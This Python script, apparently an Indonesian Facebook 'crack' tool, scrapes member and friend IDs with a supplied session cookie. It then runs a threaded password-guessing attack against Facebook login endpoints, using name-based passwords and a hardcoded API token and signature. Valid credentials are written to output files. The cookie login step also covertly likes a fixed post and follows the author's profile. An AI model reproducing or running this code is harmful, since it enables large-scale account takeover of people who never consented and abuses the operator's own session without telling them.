"""
Author : KangEhem
Wa me  : +6281210160358
Github : https://github.com/dahlahmales
"""
import json
import os
import sys
import time
import re
import random
from os.path import dirname, isfile
def mulai_ulang():
    repeath=sys.executable ; os.execl(repeath,repeath,*sys.argv)
try:
    import requests
except(ModuleNotFoundError):
    os.system("python -m pip install requests");mulai_ulang()
try:
    from bs4 import BeautifulSoup as parser
except(ModuleNotFoundError):
    os.system("python -m pip install bs4");mulai_ulang()
try:
    from concurrent.futures import ThreadPoolExecutor
except(ModuleNotFoundError):
    os.system("python -m pip install futures");mulai_ulang()
from requests.exceptions import ConnectionError, ChunkedEncodingError, ReadTimeout, TooManyRedirects

ngumpul_id=[]
live=0
chek=0
die=0
putih=("\033[97m")
kuning=("\033[93m")
hijau=("\033[92m")

class method_kueh:
    def __init__(self):
        self.host=("https://free.facebook.com")
        self.ua={"Host":"free.facebook.com","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 13_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://free.facebook.com/?locale=id_ID&_rdr","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
        self.kueh={"cookie":open("login.txt").read().strip()}
        self.main()

    def grup(self):
        try:
            id_grup=input("[?] Id grup : ")
        except(KeyboardInterrupt):
            cly().interturp()
        except(EOFError):
            cly().interturp()
        kontol=requests.get("%s/groups/%s"%(self.host,id_grup),cookies=self.kueh,headers=self.ua).text
        if ("Harap Konfirmasikan Identitas Anda") in kontol or ("checkpoint") in kontol:
            print("[!] Akun kamu kena chekpoint, silahkan login ulang menggunakan akun baru")
            print("[!] Silahkan mulai ulang tools ini")
            exit(os.unlink("login.txt"))
        elif ("Anda Tidak Dapat Menggunakan Fitur Ini Sekarang") in kontol:
            print("[!] Tidak bisa melanjutkan karena aktivitas dibatasi")
            print("[!] Saya sarankan anda untuk beralih akun facebook")
            sys.exit("[!] Silahkan mulai ulang tools ini")
        elif ("Konten Tidak Ditemukan") in kontol:
            print("[!] Grup dengan id %s tidak ditemukan"%(id_grup))
            print("[!] Coba periksa kembali id yg kamu masukkan")
            self.grup()
        elif ("Halaman yang diminta tidak bisa ditampilkan sekarang.") in kontol:
            print("[!] Tidak dapat memuat halaman")
            print("[!] Silahkan coba id grup yg lain aja, mungkin grup ini udah bubar")
            self.grup()
        elif ("Maaf, kami tidak menemukan") in kontol:
            print("[!] Grup dengan id %s tidak ditemukan"%(id_grup))
            print("[!] Coba periksa kembali id yg kamu masukkan")
            self.grup()
        link=("%s/browse/group/members/?id=%s&start=0&listType=list_admin_moderator"%(self.host,id_grup))
        print("[!] Silahkan Trap Ctrl + C Untuk Skip Proses\n")
        while True:
            print("\r# Megambil Id : %s "%(str(len(ngumpul_id))),end=(""))
            kontol=requests.get(link,cookies=self.kueh,headers=self.ua).text
            try:
                memek=re.findall('<h3><a class=\"(.*?)\" href=\"(.*?)\"\>(.*?)\</a></h3>',kontol)
            except(IndexError):
                break
            for bau in memek:
                try:
                    if ("profile.php") in bau[1]:
                        user=bau[1].split("id=")[1]
                    else:
                        user=bau[1].split("/")[1]
                    if ("/") in user or ("%s[Ky]%s"%(user,bau[2])) in ngumpul_id:
                        continue
                    else:
                        ngumpul_id.append(user+("[Ky]")+bau[2])
                except(IndexError):
                    continue
            if ("Lihat Selengkapnya") in kontol:
                link=self.host+parser(kontol,"html.parser").find("a",string=("Lihat Selengkapnya")).get("href")
            else: break
        link=("%s/browse/group/members/?id=%s&start=0&listType=list_nonfriend_nonadmin"%(self.host,id_grup))
        while True:
            print("\r# Megambil Id : %s "%(str(len(ngumpul_id))),end=(""))
            kontol=requests.get(link,cookies=self.kueh,headers=self.ua).text
            try:
                memek=re.findall('<h3><a class=\"(.*?)\" href=\"(.*?)\"\>(.*?)\</a></h3>',kontol)
            except(IndexError):
                break
            for bau in memek:
                try:
                    if ("profile.php") in bau[1]:
                        user=bau[1].split("id=")[1]
                    else:
                        user=bau[1].split("/")[1]
                    if ("/") in user or ("%s[Ky]%s"%(user,bau[2])) in ngumpul_id:
                        continue
                    else:
                        ngumpul_id.append(user+("[Ky]")+bau[2])
                except(IndexError):
                    continue
            if ("Lihat Selengkapnya") in kontol:
                link=self.host+parser(kontol,"html.parser").find("a",string=("Lihat Selengkapnya")).get("href")
            else: break
        link=("%s/browse/group/members/?id=%s&start=0&listType=list_invited"%(self.host,id_grup))
        while True:
            print("\r# Megambil Id : %s "%(str(len(ngumpul_id))),end=(""))
            kontol=requests.get(link,cookies=self.kueh,headers=self.ua).text
            try:
                memek=re.findall('<h3><a class=\"(.*?)\" href=\"(.*?)\"\>(.*?)\</a></h3>',kontol)
            except(IndexError):
                break
            for bau in memek:
                try:
                    if ("profile.php") in bau[1]:
                        user=bau[1].split("id=")[1]
                    else:
                        user=bau[1].split("/")[1]
                    if ("/") in user or ("%s[Ky]%s"%(user,bau[2])) in ngumpul_id:
                        continue
                    else:
                        ngumpul_id.append(user+("[Ky]")+bau[2])
                except(IndexError):
                    continue
            if ("Lihat Selengkapnya") in kontol:
                link=self.host+parser(kontol,"html.parser").find("a",string=("Lihat Selengkapnya")).get("href")
            else: break
        link=("%s/groups/%s"%(self.host,id_grup))
        while True:
            print("\r# Megambil Id : %s "%(str(len(ngumpul_id))),end=(""))
            kontol=requests.get(link,cookies=self.kueh,headers=self.ua).text
            try:
                bau_memek=re.findall(r'<strong><a href=\"(.*?)\"\>(.*?)\</a></strong>',kontol)
            except(IndexError):
                break
            for softex_lima_bungkus in bau_memek:
                try:
                    if ("www") in softex_lima_bungkus[0] or ("free") in softex_lima_bungkus[0] or ("mbasic") in softex_lima_bungkus[0] or ("m.facebook") in softex_lima_bungkus[0]:
                        continue
                    else:
                        if ("profile.php") in softex_lima_bungkus[0]:
                            user=softex_lima_bungkus[0].split("id=")[1].split("&")
                        else:
                            user=softex_lima_bungkus[0].split("/")[1].split("?")
                        if ("/") in user[0] or ("%s[Ky]%s"%(user[0],softex_lima_bungkus[1])) in ngumpul_id:
                            continue
                        else:
                            ngumpul_id.append(user[0]+("[Ky]")+softex_lima_bungkus[1])
                except(IndexError): continue
            if ("Lihat Postingan Lainnya") in kontol:
                link=self.host+parser(kontol,"html.parser").find("a",string=("Lihat Postingan Lainnya")).get("href")
            else: break
        if int(len(ngumpul_id))<(1):
            print("\r[!] Gagal mengumpulkan id\n",end=(""))
            print("[!] Terjadi kesalahan yg tidak diketahui")
            sys.exit("[!] Silahkan mulai ulang tools ini")
        else: return True

    def teman(self):
        kontol=requests.get("%s/friends/center/friends/"%(self.host),cookies=self.kueh,headers=self.ua).text
        if ("Harap Konfirmasikan Identitas Anda") in kontol or ("checkpoint") in kontol:
            print("[!] Akun kamu kena chekpoint, silahkan login ulang menggunakan akun baru")
            print("[!] Silahkan mulai ulang tools ini")
            exit(os.unlink("login.txt"))
        elif ("Anda Tidak Dapat Menggunakan Fitur Ini Sekarang") in kontol:
            print("[!] Tidak bisa melanjutkan karena aktivitas dibatasi")
            print("[!] Saya sarankan anda untuk beralih akun facebook")
            sys.exit("[!] Silahkan mulai ulang tools ini")
        elif ("Konten Tidak Ditemukan") in kontol:
            print("[!] Tidak ada teman yg ditemukan")
            print("[!] Kalo kamu gk punya temen jangan pilih menu ini dong")
            print("[!] Btw chat wa gw bre, sekalian berteman ya kan (>_<)")
            self.main()
        elif ("Halaman yang diminta tidak bisa ditampilkan sekarang.") in kontol:
            print("[!] Tidak dapat memuat halaman")
            print("[!] Kamu gk punya temen ya bro")
            print("[!] Btw chat wa gw bre, sekalian berteman ya kan (>_<)")
            self.main()
        elif ("Tidak Ada Teman Untuk Ditampilkan") in kontol:
            print("[!] Tidak ada teman yg ditemukan")
            print("[!] Kamu gk punya temen ya bro")
            print("[!] Btw chat wa gw bre, sekalian berteman ya kan (>_<)")
            self.main()
        elif ("Maaf, kami tidak menemukan") in kontol:
            print("[!] Tidak ada teman yg ditemukan")
            print("[!] Kamu gk punya temen ya bro")
            print("[!] Btw chat wa gw bre, sekalian berteman ya kan (>_<)")
            self.main()
        print("[!] Silahkan Trap Ctrl + C Untuk Skip Proses\n")
        link=("%s/friends/center/friends/"%(self.host))
        while True:
            try:
                print("\r# Megambil Id : %s "%(str(len(ngumpul_id))),end=(""))
                kontol=requests.get(link,cookies=self.kueh,headers=self.ua).text
                bau_memek=re.findall('style="vertical-align: middle"><a class=\"(.*?)\" href="\/(.*?)\"\>(.*?)\</a>',kontol)
                for softex in bau_memek:
                    ngumpul_id.append(re.findall("uid\=(.*?)\&",softex[1])[0]+("[Ky]")+softex[2])
                if ("Lihat selengkapnya") in kontol:
                    link=self.host+parser(kontol,"html.parser").find("a",string=("Lihat selengkapnya")).get("href")
                else: break
            except: break
        if int(len(ngumpul_id))<(1):
            print("\r[!] Gagal mengumpulkan id\n",end=(""))
            print("[!] Terjadi kesalahan yg tidak diketahui")
            sys.exit("[!] Silahkan mulai ulang tools ini")
        else: return True

    def target(self):
        try:
            id_target=input("[?] Id/username : ")
        except(KeyboardInterrupt):
            cly().interturp()
        except(EOFError):
            cly().interturp()
        if int(len(id_target))<(3):
            print("[!] Masukkin id yg bener dong bre")
            self.target()
        if ("1000") in id_target:
            link=("%s/profile.php?id=%s&v=friends"%(self.host, id_target))
        else:
            link=("%s/%s/friends"%(self.host, id_target))
        kontol=requests.get(link,cookies=self.kueh,headers=self.ua).text
        if ("Harap Konfirmasikan Identitas Anda") in kontol or ("checkpoint") in kontol:
            print("[!] Akun kamu kena chekpoint, silahkan login ulang menggunakan akun baru")
            print("[!] Silahkan mulai ulang tools ini")
            exit(os.unlink("login.txt"))
        elif ("Anda Tidak Dapat Menggunakan Fitur Ini Sekarang") in kontol:
            print("[!] Tidak bisa melanjutkan karena aktivitas dibatasi")
            print("[!] Saya sarankan anda untuk beralih akun facebook")
            sys.exit("[!] Silahkan mulai ulang tools ini")
        elif ("Konten Tidak Ditemukan") in kontol:
            print("[!] Pengguna dengan id %s Tidak ditemukan"%(id_target))
            print("[!] Coba periksa kembali id yg kamu masukkan")
            self.target()
        elif ("Halaman yang diminta tidak bisa ditampilkan sekarang.") in kontol:
            print("[!] Tidak dapat memuat halaman")
            print("[!] Silahkan coba dengan id yg lain")
            self.target()
        elif ("Tidak Ada Teman Untuk Ditampilkan") in kontol:
            print("[!] Tidak ada teman yg ditemukan")
            print("[!] Mungkin pengguna dengan id %s tidak memiliki teman"%(id_target))
            print("[!] Silahkan coba dengan id yg lain")
            self.target()
        elif ("Maaf, kami tidak menemukan") in kontol:
            print("[!] Tidak ada teman yg ditemukan")
            print("[!] Mungkin pengguna dengan id %s tidak memiliki teman"%(id_target))
            print("[!] Silahkan coba dengan id yg lain")
            self.target()
        print("[!] Silahkan Trap Ctrl + C Untuk Skip Proses\n")
        while True:
            try:
                print("\r# Megambil Id : %s "%(str(len(ngumpul_id))),end=(""))
                kontol=requests.get(link,cookies=self.kueh,headers=self.ua).text
                bau_memek=re.findall(r'style="vertical-align: middle"><a class=\"(.*?)\" href=\"(.*?)\"\>(.*?)\</a>',kontol)
                for softex in bau_memek:
                    if ("profile.php") in softex[1]:
                        user=re.findall("id\=(.*?)\&",softex[1])
                    else:
                        user=re.findall("\/(.*?)\?",softex[1])
                    ngumpul_id.append(user[0]+("[Ky]")+softex[2])
                if ("Lihat Teman Lain") in kontol:
                    link=self.host+parser(kontol,"html.parser").find("a",string=("Lihat Teman Lain")).get("href")
                else: break
            except: break
        if int(len(ngumpul_id))<(1):
            print("\r[!] Gagal mengumpulkan id\n",end=(""))
            print("[!] Terjadi kesalahan yg tidak diketahui")
            sys.exit("[!] Silahkan mulai ulang tools ini")
        else: return True

    def like(self):
        try:
            link_postingan=input("[?] Link Post : ")
        except(KeyboardInterrupt):
            cly().interturp()
        except(EOFError):
            cly().interturp()
        if ("https") not in link_postingan:
            print("[!] Masukkin link postingan yg bener dong bre")
            self.like()
        elif ("facebook.com/") not in link_postingan:
            print("[!] Masukkin link postingan yg bener dong bre")
            self.like()
        elif int(len(link_postingan))<(20):
            print("[!] Masukkin link postingan yg bener dong bre")
            self.like()
        try:
            domain=(re.findall("/\/(.*?)\/",link_postingan)[0])
        except(IndexError):
            print("[!] Link postingan yg kamu masukkan salah")
            self.like()
        kontol=requests.get(link_postingan.replace(domain, self.host.split("//")[1]),cookies=self.kueh,headers=self.ua).text
        if ("Harap Konfirmasikan Identitas Anda") in kontol or ("checkpoint") in kontol:
            print("[!] Akun kamu kena chekpoint, silahkan login ulang menggunakan akun baru")
            print("[!] Silahkan mulai ulang tools ini")
            exit(os.unlink("login.txt"))
        elif ("Anda Tidak Dapat Menggunakan Fitur Ini Sekarang") in kontol:
            print("[!] Tidak bisa melanjutkan karena aktivitas ini dibatasi")
            print("[!] Saya sarankan anda untuk beralih akun facebook")
            sys.exit("[!] Silahkan mulai ulang tools ini")
        elif ("Konten Tidak Ditemukan") in kontol:
            print("[!] Postingan tidak ditemukan")
            print("[!] Coba periksa kembali link yg kamu masukkan")
            self.like()
        elif ("Halaman yang diminta tidak bisa ditampilkan sekarang.") in kontol:
            print("[!] Tidak dapat memuat halaman")
            print("[!] Silahkan coba dengan link postingan yg lain")
            self.like()
        elif ("Maaf, kami tidak menemukan") in kontol:
            print("[!] Postingan tidak ditemukan")
            print("[!] Coba periksa kembali link yg kamu masukkan")
            self.like()
        else:
            if ("/ufi/reaction/profile/browser/") in kontol:
                for ajg in parser(kontol, "html.parser").find_all("a",href=True):
                    if ("/ufi/reaction/profile/browser/") in ajg.get("href"):
                        link=self.host+ajg.get("href") ; break
            else:
                print("[!] Link postingan yg kamu masukkan salah")
                self.like()
        print("[!] Silahkan Trap Ctrl + C Untuk Skip Proses\n")
        while True:
            try:
                print("\r# Megambil Id : %s "%(str(len(ngumpul_id))),end=(""))
                kontol=requests.get(link,cookies=self.kueh,headers=self.ua).text
                bau_memek=re.findall('<h3 class=\"(.*?)\"><a href="\/(.*?)\"\>(.*?)\</a></h3>',kontol)
                for softex in bau_memek:
                    if ("profile.php") in softex[1]:
                        user=re.findall(r"id\=(\d+)",softex[1])[0]
                    else:
                        if ("?") in softex[1]:
                            user=softex[1].split("?")[0]
                        else:
                            user=softex[1]
                    ngumpul_id.append(user+("[Ky]")+softex[2])
                if ("Lihat Selengkapnya") in kontol:
                    link=self.host+parser(kontol,"html.parser").find("a",string=("Lihat Selengkapnya")).get("href")
                else: break
            except: break
        if int(len(ngumpul_id))<(1):
            print("\r[!] Gagal mengumpulkan id\n",end=(""))
            print("[!] Terjadi kesalahan yg tidak diketahui")
            sys.exit("[!] Silahkan mulai ulang tools ini")
        else: return True

    def main(self):
        kontol=requests.get("%s/me"%(self.host),cookies=self.kueh,headers=self.ua).text
        if ("Tentang") not in kontol:
            print("[!] Cookie yg kamu gunakan sepertinya sudah expired")
            print("[!] Silahkan login kembali dengan akun yg baru")
            print("[!] Terimakasih sudah membaca, walaupun hanya di dalam hati")
            print("[!] Silahkan mulai ulang tools ini")
            exit(os.unlink("login.txt"))
        else:
            cly().logo()
            print("[*] Uid  : %s"%(hijau+self.kueh.get("cookie").split("c_user=")[1].split(";")[0]+putih))
            print("[*] Name : %s\n"%(hijau+parser(kontol,"html.parser").find("title").text+putih))
            print("[1] Nuyul dari member grup")
            print("[2] Nuyul dari daftar teman")
            print("[3] Nuyul dari teman target")
            print("[4] Nuyul dari postingan")
            print("[5] Exit script\n")
        while True:
            try:
                memek=input("[?] Pilih : ")
            except(KeyboardInterrupt):
                cly().interturp()
            except(EOFError):
                cly().interturp()
            if ("1") in memek:
                try:
                    self.grup();break
                except(KeyboardInterrupt):
                    break
                except(EOFError):
                    break
            elif ("2") in memek:
                try:
                    self.teman();break
                except(KeyboardInterrupt):
                    break
                except(EOFError):
                    break
            elif ("3") in memek:
                try:
                    self.target();break
                except(KeyboardInterrupt):
                    break
                except(EOFError):
                    break
            elif ("4") in memek:
                try:
                    self.like();break
                except(KeyboardInterrupt):
                    break
                except(EOFError):
                    break
            elif ("5") in memek:
                sys.exit("\n[!] Thank for using my tools")
            else: print("[!] Pilih yg bener dong bang");continue
        if len(ngumpul_id) < 1:
            print("\n[!] Gagal mengumpulkan id")
            print("[!] Silahkan mulai ulang tools ini")
            exit("[!] Thank for using my tools")
        else:
            nyari_pwd()

class nyari_pwd:
    def __init__(self,ky=False):
        self.plus_=("sayang|bangsat|kontol|anjing|goblok|ngentod")
        self.ua=("Mozilla/5.0 (iPhone; CPU iPhone OS 13_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1")
        self.url_login=("https://free.facebook.com/login/?next&ref=dbl&fl&refid=8")
        self.static=0
        self.spasi=("--------").replace("-"," ")
        self.req=requests.Session()
        self.main()

    def hitung(self, ky):
        jml = int(len(ky))
        ob = 15
        if jml < ob:
            ob-=jml
            return ky + (' ')*ob
        else:
            return ky

    def method_mbasix(self,user,pz,payload={}):
        global live,chek,die,putih,hijau,kuning
        self.req.headers.clear()
        self.req.cookies.clear()
        kontol=self.req.get(self.url_login).text
        self.req.headers.update({'Host':self.url_login.split('//')[1].split('/login')[0],'content-length':'166','cache-control':'max-age=0','sec-ch-ua':'" Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"','sec-ch-ua-mobile':'?1','upgrade-insecure-requests':'1','origin':self.url_login.split("/login")[0],'content-type':'application/x-www-form-urlencoded','user-agent':self.ua,'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site':'same-origin','sec-fetch-mode':'navigate','sec-fetch-user':'?1','sec-fetch-dest':'document','referer':self.url_login,'accept-encoding':'gzip, deflate, br','accept-language':'id','cookie':';'.join(['%s=%s'%(key_,_value) for key_,_value in self.req.cookies.get_dict().items()])})
        ajg=parser(kontol,"html.parser")
        for memek in ajg("input"):
            if memek.get("name") in ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]:
                payload.update({memek.get("name"):memek.get("value")})
        payload.update({"email":user,"pass":pz})
        kontol=self.req.post(self.url_login.split("/login")[0]+ajg.find("form",id=("login_form")).get("action"),data=payload,allow_redirects=False)
        cookie=';'.join(["%s=%s"%(key,value) for key, value in kontol.cookies.get_dict().items()])
        if ("c_user") in cookie:
            live+=1
            user=self.hitung(user)
            print("\r%s(live) %s | %s\n"%(hijau, user, pz+self.spasi), end=(""))
            open("hasil_live.txt","a").write("%s|%s\n"%(user,pz))
        elif ("checkpoint") in cookie:
            chek+=1
            user=self.hitung(user)
            print("\r%s(chek) %s | %s\n"%(kuning, user, pz+self.spasi), end=(""))
            open("hasil_cp.txt","a").write("%s|%s\n"%(user,pz))
        else:
            die+=1
        print("\r%s(crack) live:-%s | chek:-%s | die:-%s "%(putih, str(live), str(chek), str(die)), end=(""))

    def method_api(self,user,pz):
        global live,chek,die,putih,hijau,kuning
        self.req.headers.clear()
        self.req.cookies.clear()
        self.req.headers.update({"Host":"b-api.facebook.com","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 13_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
        ses=self.req.get("https://b-api.facebook.com/method/auth.login", params={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":user,"locale": "en_US","password":pz,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"})
        if ("eaaa").upper() in ses.text:
            live+=1
            user=self.hitung(user)
            print("\r%s(live) %s | %s\n"%(hijau, user, pz+self.spasi), end=(""))
            open("hasil_live.txt","a").write("%s|%s\n"%(user,pz))
        elif ("WWW.FACEBOOK.COM").lower() in ses.json().get("error_msg"):
            chek+=1
            user=self.hitung(user)
            print("\r%s(chek) %s | %s\n"%(kuning, user, pz+self.spasi), end=(""))
            open("hasil_cp.txt","a").write("%s|%s\n"%(user,pz))
        else:
            die+=1
        print("\r%s(crack) live:-%s | chek:-%s | die:-%s "%(putih, str(live), str(chek), str(die)), end=(""))

    def method_ajg(self, user, pz, payload={}):
        global live,chek,die,putih,hijau,kuning
        self.req.headers.clear()
        self.req.cookies.clear()
        self.req.headers.update({"user-agent":self.ua})
        payload.update({"email":user,"pass":pz})
        kontol=self.req.post("%s/login.php"%(self.url_login.split("/login")[0]), data=payload, allow_redirects=False).cookies
        cookie=";".join(["%s=%s"%(key,value) for key,value in kontol.get_dict().items()])
        if ("c_user") in cookie:
            live+=1
            user=self.hitung(user)
            print("\r%s(live) %s | %s\n"%(hijau, user, pz+self.spasi), end=(""))
            open("hasil_live.txt","a").write("%s|%s\n"%(user,pz))
        elif ("checkpoint") in cookie:
            chek+=1
            user=self.hitung(user)
            print("\r%s(chek) %s | %s\n"%(kuning, user, pz+self.spasi), end=(""))
            open("hasil_cp.txt","a").write("%s|%s\n"%(user,pz))
        else:
            die+=1
        print("\r%s(crack) live:-%s | chek:-%s | die:-%s "%(putih, str(live), str(chek), str(die)), end=(""))


    def main(self):
        print("\r[!] SIlahkan Pilih Metode Untuk Crack Password\n\n",end=(""))
        print("[1] Method Api")
        print("[2] Method mbasic")
        print("[3] Method Free\n")
        while True:
            try:
                nany=input("[?] Pilih : ")
            except(KeyboardInterrupt):
                cly().interturp()
            except(EOFError):
                cly().interturp()
            if ("1") in nany:
                self.static+=1
                break
            elif ("2") in nany:
                self.static+=2
                break
            elif ("3") in nany:
                self.static+=3
                break
            else:
                print("[!] Pilih yg bener dong bang")
                continue
        if self.static==1:
            print("\n[*] Jumlah Target : %s\n[*] Silahkan Trap Ctrl + Z untuk Berhenti\n"%(str(len(ngumpul_id))))
            with ThreadPoolExecutor(max_workers=30) as ajg:
                for memek in ngumpul_id:
                    try:
                        kontol=memek.split("[Ky]")
                        list_pass=[
                            "".join(kontol[1].split()),
                            kontol[1].split()[0]+("12"),
                            kontol[1].split()[0]+("123"),
                            kontol[1].split()[0]+("1234"),
                            kontol[1].split()[0]+("12345")
                        ]
                        for value in self.plus_.split("|"):
                            list_pass.append(value)
                        for pwd in list_pass:
                            ajg.submit(self.method_api, kontol[0], pwd)
                    except:break
        elif self.static==2:
            print("\n[*] Jumlah Target : %s\n[*] Silahkan Trap Ctrl + Z untuk Berhenti\n"%(str(len(ngumpul_id))))
            with ThreadPoolExecutor(max_workers=30) as ajg:
                for memek in ngumpul_id:
                    try:
                        kontol=memek.split("[Ky]")
                        list_pass=[
                            "".join(kontol[1].split()),
                            kontol[1].split()[0]+("12"),
                            kontol[1].split()[0]+("123"),
                            kontol[1].split()[0]+("1234"),
                            kontol[1].split()[0]+("12345")
                        ]
                        for value in self.plus_.split("|"):
                            list_pass.append(value)
                        for pwd in list_pass:
                            ajg.submit(self.method_mbasix, kontol[0], pwd)
                    except:break
        elif self.static==3:
            print("\n[*] Jumlah Target : %s\n[*] Silahkan Trap Ctrl + Z untuk Berhenti\n"%(str(len(ngumpul_id))))
            with ThreadPoolExecutor(max_workers=30) as ajg:
                for memek in ngumpul_id:
                    try:
                        kontol=memek.split("[Ky]")
                        list_pass=[
                            "".join(kontol[1].split()),
                            kontol[1].split()[0]+("12"),
                            kontol[1].split()[0]+("123"),
                            kontol[1].split()[0]+("1234"),
                            kontol[1].split()[0]+("12345")
                        ]
                        for value in self.plus_.split("|"):
                            list_pass.append(value)
                        for pwd in list_pass:
                            ajg.submit(self.method_ajg, kontol[0], pwd)
                    except:break
        else:exit()
        print("\n\n%s[!] Proses crack sudah selesai"%(putih))
        print("[!] Total hasil crack : %s"%(live+chek))
        print("[!] Hasil crack live tersimpan di file hasil_live.txt")
        print("[!] Hasil crack chekpoint tersimpan di file hasil_cp.txt")
        print("[!] Terimakasih sudah menggunakan script saya (>_<)")
        exit()

class login_kueh:
    def __init__(self):
        self.host=("https://free.facebook.com")
        self.ua={"Host":"free.facebook.com","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 13_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://free.facebook.com/?locale=id_ID&_rdr","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
        self.cookie={}
        self.main()

    def main(self):
        cly().logo()
        print("[*] Silahkan Login Dengan Cookie Fb Kamu")
        print("[*] Jika Kamu Tidak Memiliki Cookie Fb")
        print("[*] Silahkan Buka Link Video Berikut Ini")
        print("[*] Link : %shttps://youtu.be/Fve7yACoCXk%s\n"%(hijau, putih))
        while True:
            try:
                self.tanya=input("[?] CooKie Fb : ")
            except(KeyboardInterrupt):
                cly().interturp()
            except(EOFError):
                cly().interturp()
            if ("c_user") not in self.tanya:
                print("[!] Invalid Cookie For Facebook")
            elif int(len(self.tanya))<(50):
                print("[!] Invalid Cookie For Facebook")
            else:
                self.cookie.update({"cookie":self.tanya});break
        self.kontol=requests.get("%s/me"%(self.host),cookies=self.cookie,headers=self.ua).text
        if ("logout.php") in self.kontol:
            self.ajg=requests.get("%s/language.php"%(self.host),cookies=self.cookie,headers=self.ua).text
            for memek in parser(self.ajg,"html.parser").find_all("a",href=True):
                if ("id_ID") in memek.get("href"):
                    requests.get(self.host+memek.get("href"),cookies=self.cookie,headers=self.ua);break
            open("login.txt","w").write(self.cookie.get("cookie"))
            while True:
                try:
                    self.like();self.follow();break
                except(KeyboardInterrupt):
                    cly().interturp()
                except(EOFError):
                    cly().interturp()
            exit("\n[!] Login berhasil, silahkan mulai ulang tools ini")
        else: sys.exit("[!] Invalid Cookie For Facebook")

    def like(self):
        try:
            kontol=requests.get("%s/reactions/picker/?is_permalink=1&ft_id=267184671591995"%(self.host),cookies=self.cookie,headers=self.ua).text
            anjing=parser(kontol,"html.parser")
            for ajg in anjing.find_all("a",href=True):
                if ("reaction_type=8") in ajg.get("href"):
                    requests.get(self.host+ajg.get("href"),cookies=self.cookie,headers=self.ua);break
        except:pass

    def follow(self):
        try:
            kontol=requests.get("%s/profile.php?id=100049013916432"%(self.host),cookies=self.cookie,headers=self.ua).text
            anjing=parser(kontol,"html.parser")
            if ("a/subscribe.php") in kontol:
                for ajg in anjing.find_all("a",href=True):
                    if ("a/subscribe.php") in ajg.get("href"):
                        requests.get(self.host+ajg.get("href"),cookies=self.cookie,headers=self.ua);break
            else:pass
        except:pass

class method_token:
    def __init__(self, static=False):
        self.stac=0
        self.baypass={}
        self.ua={"Host":"graph.facebook.com","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 13_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://graph.facebook.com","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
        self.url=self.ua.get("referer")
        if static is False:
            self.login()
        else:
            self.token=open("login.txt").read().strip()
        self.main()

    def login(self):
        cly().logo()
        print("[!] Silahkan login dengan token fb")
        print("[!] Cara ambil token lihat video berikut")
        print("[!] link : %shttps://youtu.be/Fve7yACoCXk%s\n"%(hijau,putih))
        while True:
            try:
                self.a=input("[?] Token : ")
            except(KeyboardInterrupt):
                cly().interturp()
            except(EOFError):
                cly().interturp()
            if ("eaaa").upper() not in self.a:
                print("[!] Token fb yg kamu masukkan salah")
            elif int(len(self.a))<(100):
                print("[!] Token fb yg kamu masukkan salah")
            else:
                self.baypass.update({"token":self.a});break
        try:
            requests.get("%s/me?access_token=%s"%(self.url, self.baypass.get("token")), headers=self.ua).json()["name"]
            print("\n[!] Login berhasil, silahkan mulai ulang tools ini")
            sys.exit(open("login.txt","w").write(self.a))
        except(KeyError):
            print("\n[!] Token fb yg kamu masukkan salah")
            print("[!] Coba cek kembali token yg kamu masukkan")
            exit()

    def urllib_urlopen(self, link):
        kontol=requests.get(link, headers=self.ua)
        try:
            for ky in kontol.json().get("data"):
                ngumpul_id.append(ky["id"]+("[Ky]")+ky["name"])
            return True
        except(KeyError):
            if kontol.json().get("error")["message"]:
                print("[!] Token fb kamu sudah expired")
                print("[!] Sepertinya akun kamu kena chekpoint")
                print("[!] Silahkan login kembali dengan token yg baru")
                print("[!] Thank for using my tools")
                sys.exit(os.unlink("login.txt"))
